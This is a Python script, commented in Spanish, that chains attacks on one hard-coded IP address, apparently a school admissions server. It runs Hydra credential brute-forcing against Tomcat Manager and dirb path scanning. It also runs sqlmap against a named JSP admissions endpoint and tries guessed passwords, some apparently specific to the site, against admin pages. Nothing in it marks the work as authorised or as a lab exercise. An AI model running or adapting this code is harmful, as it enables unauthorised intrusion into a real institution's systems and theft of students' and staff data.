#!/usr/bin/env python3
# ATAQUE DIRECTO CON WORDLISTS DE PARROT OS
import requests
import subprocess
import os

target = "189.254.143.102"

class DirectAttack:
    def __init__(self):
        self.session = requests.Session()
        
    def hydra_tomcat_manager(self):
        """Ejecuta Hydra contra Tomcat Manager"""
        print("[+] EJECUTANDO HYDRA CONTRA TOMCAT MANAGER...")
        
        # Usar wordlists de Metasploit
        cmd = f"hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt {target} http-get /manager/html -t 5 -V"
        os.system(cmd)
    
    def dirb_scan(self):
        """Escaneo con Dirb para encontrar rutas"""
        print("[+] ESCANEANDO RUTAS CON DIRB...")
        
        cmd = f"dirb http://{target} /usr/share/dirb/wordlists/common.txt -o dirb_scan.txt"
        os.system(cmd)
        
        # Buscar resultados interesantes
        if os.path.exists("dirb_scan.txt"):
            with open("dirb_scan.txt", "r") as f:
                content = f.read()
                if "CODE:200" in content:
                    print("✅ RUTAS ENCONTRADAS:")
                    for line in content.split('\n'):
                        if "CODE:200" in line:
                            print(f"   {line.strip()}")
    
    def sqlmap_attack(self):
        """Ataque SQLMap al endpoint AJAX"""
        print("[+] EJECUTANDO SQLMAP...")
        
        cmd = f"sqlmap -u 'http://{target}/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1' --batch --dbs --level=3"
        os.system(cmd)
    
    def test_credentials_directly(self):
        """Probar credenciales directamente en endpoints"""
        print("[+] PROBANDO CREDENCIALES DIRECTAMENTE...")
        
        # Credenciales a probar
        credentials = [
            ('hnieto', 'utslp'),
            ('admin', 'admin'),
            ('tomcat', 'tomcat'),
            ('manager', 'manager'),
            ('sito', 'sito'),
            ('utslp', 'utslp')
        ]
        
        # Endpoints a probar
        endpoints = [
            "/manager/html",
            "/manager/status",
            "/host-manager/html",
            "/jsp/admin/",
            "/jsp/configuracion/"
        ]
        
        for user, pwd in credentials:
            for endpoint in endpoints:
                url = f"http://{target}{endpoint}"
                try:
                    r = requests.get(url, auth=(user, pwd), timeout=5)
                    if r.status_code == 200:
                        print(f"🎉 CREDENCIALES VÁLIDAS: {user}:{pwd} en {endpoint}")
                        return True
                except:
                    continue
        return False

# Ejecutar ataque completo
attack = DirectAttack()
attack.hydra_tomcat_manager()
attack.dirb_scan() 
attack.sqlmap_attack()
attack.test_credentials_directly()